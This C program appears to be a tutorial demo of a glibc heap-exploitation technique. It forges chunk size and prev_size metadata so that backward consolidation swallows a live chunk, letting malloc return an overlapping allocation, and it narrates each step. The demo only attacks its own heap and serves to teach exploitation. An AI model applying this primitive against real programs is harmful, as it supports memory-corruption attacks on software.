#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE 0x420
#define CHUNK_SIZE_HEADER_VALUE 0x431
#define CONSOLIDATED_SIZE 0x471

#define FAKE_CHUNK_PREV_SIZE 0x470
#define FAKE_CHUNK_SIZE 0x21

#define CHECK_CHUNK_PREV_SIZE 0x20
#define CHECK_CHUNK_SIZE 0x30

#define CONSOLIDATED_CHUNK_ALLOCATION_SIZE 0x480

void main() {
    long *chunk0,
            *chunk1,
            *chunk2,
            *chunk3,
            *first_consolidated_chunk,
            *overlapping_chunk;

    printf("So for this time, we will try to allocate overlapping chunks.\n");
    printf("We will use backwards chunk consolidation to do this.\n");
    printf("We will not make a fake heap chunk for this consolidation method.\n");
    printf("Instead we will be leveraging existing chunks.\n\n");

    printf("We will go ahead, and allocate four separate chunks.\n");
    printf("The last chunk will be used to prevent consolidation into the top chunk.\n");
    printf("We will go ahead, and free the first chunk.\n");
    printf("Proceeding that, we will go ahead and expand its size, to encompass the first two chunks.\n");
    printf("Then for the third chunk we will make the PREV_INUSE bit as 0.\n");
    printf("In addition for the third chunk, we will set the prev_size to the expanded size of the first chunk.\n\n");

    printf("At this point, from the perspective of the heap chunk headers, the third chunk directly follows the first chunk.\n\n");
    printf("On top of that, the first chunk has been freed.\n");
    printf("We will go ahead and free the third chunk, which will be consolidated into the first.\n");
    printf("Of course this consolidated chunk will also include our second heap chunk, even though it hasn't been freed.\n\n");

    printf("Once we get the large consolidated chunk, we will allocate a smaller chunk from it.\n");
    printf("This smaller chunk will be the original size of the first chunk.\n");
    printf("This way, the next allocation from the consolidated chunk, will begin where the second chunk starts.\n");
    printf("That will allow us to allocate the same chunk multiple times without freeing it.\n\n");


    chunk0 = malloc(CHUNK_SIZE);
    chunk1 = malloc(CHUNK_SIZE);
    chunk2 = malloc(CHUNK_SIZE);
    chunk3 = malloc(CHUNK_SIZE);


    printf("Here are our chunks:\n\n");

    printf("Chunk0:\t%p\n", chunk0);
    printf("Chunk1:\t%p\n", chunk1);
    printf("Chunk2:\t%p\n", chunk2);
    printf("Chunk3:\t%p\n\n", chunk3);

    printf("Now to free chunk0!\n\n");

    free(chunk0);

    printf("Now to expand the size of chunk0, and set heap chunk data for chunk2.\n\n");

    chunk2[-1] = 0x430;
    chunk2[-2] = 0x860;

    chunk0[-1] = 0x860;

    printf("Now to free chunk2, and cause chunk consolidation to swallow chunk1.\n\n");

    free(chunk2);

    first_consolidated_chunk = malloc(CHUNK_SIZE);
    overlapping_chunk = malloc(CHUNK_SIZE);

    printf("First chunk allocated from consolidated chunk: %p\n", first_consolidated_chunk);
    printf("Overlapping Chunk: %p\n", overlapping_chunk);
    printf("Is the chunk overlapping:\t%s\n", overlapping_chunk==chunk1?"True":"False");
}
